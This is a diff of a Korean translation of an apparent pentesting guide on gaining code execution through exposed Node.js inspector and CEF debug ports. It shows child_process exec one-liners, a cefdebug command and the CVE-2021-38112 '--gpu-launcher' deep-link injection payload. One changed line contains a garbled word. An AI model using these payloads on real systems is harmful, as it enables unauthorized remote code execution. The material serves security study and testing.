@@ -19,13 +19,13 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 [From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): `--inspect` 스위치로 시작하면, Node.js 프로세스는 디버깅 클라이언트를 위해 대기합니다. **기본적으로**, 호스트와 포트 **`127.0.0.1:9229`**에서 대기합니다. 각 프로세스는 **고유한** **UUID**도 할당받습니다.
 
-Inspector 클라이언트는 연결하기 위해 호스트 주소, 포트 및 UUID를 알고 지정해야 합니다. 전체 URL은 `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`와 비슷하게 보일 것입니다.
+인스펙터 클라이언트는 연결하기 위해 호스트 주소, 포트 및 UUID를 알아야 하고 지정해야 합니다. 전체 URL은 `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`와 비슷하게 보일 것입니다.
 
 {% hint style="warning" %}
-**디버거가 Node.js 실행 환경에 완전한 접근 권한을 가지고 있기 때문에**, 이 포트에 연결할 수 있는 악의적인 행위자는 Node.js 프로세스를 대신하여 임의의 코드를 실행할 수 있습니다 (**잠재적인 권한 상승**).
+**디버거가 Node.js 실행 환경에 완전한 접근 권한을 가지므로**, 이 포트에 연결할 수 있는 악의적인 행위자는 Node.js 프로세스를 대신하여 임의의 코드를 실행할 수 있습니다 (**잠재적인 권한 상승**).
 {% endhint %}
 
-Inspector를 시작하는 방법은 여러 가지가 있습니다:
+인스펙터를 시작하는 방법은 여러 가지가 있습니다:
 ```bash
 node --inspect app.js #Will run the inspector in port 9229
 node --inspect=4444 app.js #Will run the inspector in port 4444
@@ -64,7 +64,7 @@ kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 ```
 {% hint style="info" %}
-이것은 컨테이너에서 유용합니다. 왜냐하면 `--inspect`로 **프로세스를 종료하고 새로 시작하는 것**은 **옵션이 아니기 때문**입니다. **컨테이너**는 **프로세스와 함께 종료됩니다**.
+이것은 컨테이너에서 유용합니다. 왜냐하면 `--inspect`로 **프로세스를 종료하고 새로 시작하는 것**은 **옵션이 아니기** 때문입니다. **컨테이너**는 프로세스와 함께 **종료됩니다**.
 {% endhint %}
 
 ### 검사기/디버거에 연결
@@ -90,7 +90,7 @@ debug> exec("process.mainModule.require('child_process').exec('/Applications/iTe
 ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
 ```
 {% hint style="info" %}
-**NodeJS RCE 익스플로잇은** [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)에 연결된 경우 작동하지 않습니다(흥미로운 작업을 수행하기 위해 API를 확인해야 합니다).
+**NodeJS RCE 익스플로잇은** [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)에 연결된 경우 작동하지 않습니다(흥미로운 작업을 찾으려면 API를 확인해야 합니다).
 {% endhint %}
 
 ## NodeJS 디버거/인스펙터에서의 RCE
@@ -99,7 +99,7 @@ debug> exec("process.mainModule.require('child_process').exec('/Applications/iTe
 [**Electron에서 XSS로 RCE를 얻는 방법을 찾고 있다면 이 페이지를 확인하세요.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
 {% endhint %}
 
-Node **인스펙터**에 **연결**할 수 있을 때 **RCE**를 얻는 일반적인 방법은 다음과 같은 것을 사용하는 것입니다(이 **Chrome DevTools 프로토콜에 연결된 경우 작동하지 않을 것 같습니다**):
+Node **인스펙터**에 **연결**할 수 있을 때 **RCE**를 얻는 일반적인 방법 중 일부는 다음과 같습니다(이것은 **Chrome DevTools 프로토콜에 연결된 경우 작동하지 않을 것 같습니다**):
 ```javascript
 process.mainModule.require('child_process').exec('calc')
 window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
@@ -108,16 +108,16 @@ Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
 ```
 ## Chrome DevTools Protocol Payloads
 
-You can check the API here: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
-In this section I will just list interesting things I find people have used to exploit this protocol.
+API를 여기에서 확인할 수 있습니다: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
+이 섹션에서는 사람들이 이 프로토콜을 악용하는 데 사용한 흥미로운 것들을 나열하겠습니다.
 
-### Parameter Injection via Deep Links
+### Deep Links를 통한 매개변수 주입
 
-In the [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security discovered that an application based on CEF **registered a custom URI** in the system (workspaces://) that received the full URI and then **launched the CEF based application** with a configuration that was partially constructing from that URI.
+[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)에서 Rhino 보안팀은 CEF 기반 애플리케이션이 시스템에 **사용자 정의 URI**(workspaces://)를 등록하여 전체 URI를 수신하고, 그 URI에서 부분적으로 구성된 설정으로 **CEF 기반 애플리케이션**을 실행한다는 것을 발견했습니다.
 
-It was discovered that the URI parameters were URL decoded and used to launch the CEF basic application, allowing a user to **inject** the flag **`--gpu-launcher`** in the **command line** and execute arbitrary things.
+URI 매개변수가 URL 디코딩되어 CEF 기본 애플리케이션을 실행하는 데 사용되었으며, 사용자가 **명령줄**에 플래그 **`--gpu-launcher`**를 **주입**하고 임의의 작업을 실행할 수 있게 되었습니다.
 
-So, a payload like:
+따라서, 다음과 같은 페이로드:
 ```
 workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
 ```
@@ -139,7 +139,7 @@ downloadPath: '/code/'
 ```
 ### Webdriver RCE 및 유출
 
-이 게시물에 따르면: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) RCE를 얻고 내부 페이지를 유출하는 것이 가능합니다.
+이 게시물에 따르면: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) RCE를 얻고 theriver의 내부 페이지를 유출하는 것이 가능합니다.
 
 ### 사후 활용
 
